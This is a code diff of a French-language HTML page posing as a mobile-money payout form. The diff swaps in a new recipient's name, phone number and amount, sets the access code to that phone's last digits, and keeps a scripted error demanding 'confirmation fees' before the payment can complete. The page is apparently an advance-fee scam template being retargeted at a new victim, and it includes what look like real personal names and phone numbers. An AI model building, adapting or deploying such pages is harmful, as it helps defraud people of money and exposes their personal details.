@@ -155,17 +155,17 @@
         <form id="tmoneyForm" onsubmit="return false;">
             <div class="form-group">
                 <label for="name">Nom et Prénom</label>
-                <input type="text" id="name" value="Koumba Titi " disabled>
+                <input type="text" id="name" value="Williamson Louis " disabled>
             </div>
 
             <div class="form-group">
                 <label for="phone">Numéro</label>
-                <input type="tel" id="phone" value="055596322" disabled>
+                <input type="tel" id="phone" value="+14014921444" disabled>
             </div>
 
             <div class="form-group">
                 <label for="amount">Montant à recevoir</label>
-                <input type="text" id="amount" class="amount" value="730 000 F CFA " disabled>
+                <input type="text" id="amount" class="amount" value="8 500 $ " disabled>
             </div>
 
             <button type="button" onclick="startProgress()">Procéder</button>
@@ -177,7 +177,7 @@
                 <div class="progress-bar" id="progressBar"></div>
             </div>
 
-            <div class="notification-message" id="notificationMessage">Erreur : Veuillez payer les frais d'activation de la carte d'investisseur afin de terminer la transaction.</div>
+            <div class="notification-message" id="notificationMessage">Erreur : Veuillez payer les frais de confirmation afin de terminer la transaction.</div>
         </form>
     </div>
 
@@ -186,7 +186,7 @@
             const accessCode = document.getElementById('accessCode').value;
             const accessError = document.getElementById('accessError');
 
-            if (accessCode === "6322") {
+            if (accessCode === "1444") {
                 accessError.style.display = 'none';
                 document.getElementById('accessContainer').style.display = 'none';
                 document.getElementById('formContainer').style.display = 'block';
